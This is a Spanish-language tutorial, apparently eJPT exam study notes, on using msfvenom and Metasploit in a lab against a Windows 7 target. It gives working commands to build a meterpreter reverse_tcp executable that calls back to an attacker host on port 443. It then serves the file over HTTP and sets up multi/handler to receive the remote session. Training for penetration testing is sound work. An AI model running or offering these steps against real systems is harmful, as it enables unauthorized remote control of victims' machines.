
---
- TAG: #Payloads #Metasploit #Msfvenom
---
# Uso de Msfvenom para Crear Payloads

Este es un repositorio muy importante ya que aprenderemos a utilizar **Msfvenom** para crear nuestros propios payloads y ganar acceso a nuestras máquinas objetivo. Es una herramienta fundamental que forma parte de **Metasploit** y nos permite crear archivos o ejecutables maliciosos para obtener acceso a una máquina al ejecutarlos, algo que seguramente utilizaremos en la eJPT.

## Herramientas Necesarias

- **Máquina atacante**: Kali Linux
- **Máquina objetivo**: Windows 7

## Crear un Archivo .exe Malicioso

Desde nuestra máquina Kali, nos ubicamos en el escritorio y nos logeamos como root. Empezaremos a crear un archivo `.exe` malicioso. La estructura del comando consta de poner el payload, la IP de la máquina atacante, el puerto de la máquina atacante; casi siempre es la misma estructura:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f exe -o pwned.exe
```

Si hacemos un `ls`, veremos que se habrá creado con éxito.

## Compartir el Archivo Malicioso

Este archivo lo compartiremos por el puerto `80` de la siguiente manera:

```bash
python -m http.server 80 
```

Desde nuestra máquina víctima, ingresamos al navegador, introducimos la IP de la máquina atacante y se nos mostrará el archivo. Le damos click para descargarlo.

## Preparar la Máquina Atacante para Recibir la Conexión

Hemos aprendido cómo pasar un archivo malicioso creado con **msfvenom**, ahora falta la otra mitad más importante: preparar la máquina atacante para recibir la conexión. Para ello, utilizaremos una herramienta de Metasploit llamada **multi/handler**. Es una herramienta que utilizaremos mucho en la eJPT.

Abrimos **msfconsole**. Aunque también tenemos la opción de usar **netcat** para recibir conexiones, en el examen recomiendo utilizar más **multi/handler**.

Dentro de Metasploit, realizamos el siguiente comando:

```msfconsole
use multi/handler
```

Con esto cargaremos el módulo y podemos ver lo que nos pide. En este caso, nos pide un **LHOST** y un **LPORT**.

Recuerden que habíamos asignado un **windows/x64/meterpreter/reverse_tcp**, es decir, está configurado para recibir un meterpreter y no una **shell**. Así que dentro de este payload también tenemos que asignarle un meterpreter. Lo podemos cambiar de la siguiente manera:

```msfconsole
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Podremos observar que al hacer un `show options`, el apartado de **Payload options** estará cambiado por nuestro payload.

Recuerden que habíamos asignado el puerto **443**, así que lo cambiamos:

```msfconsole
set LPORT 443
```

Ahora le asignamos la dirección IP de nuestra máquina atacante Kali Linux:

```msfconsole
set LHOST 1.2.3.4
```

Una vez hecho esto, está todo correctamente configurado para que nuestra máquina atacante entable una conexión.

## Ejecutar el Archivo en la Máquina Objetivo

Debemos ir a nuestra máquina **Windows 7** y ejecutar el archivo `.exe` que habíamos descargado por el servidor. Veremos que obtenemos acceso a la máquina. Recuerden que la dirección IP y el puerto en ambos lados siempre deben ser de la máquina atacante.

Si han seguido todos los pasos, seguramente estarán dentro de la máquina Windows :)
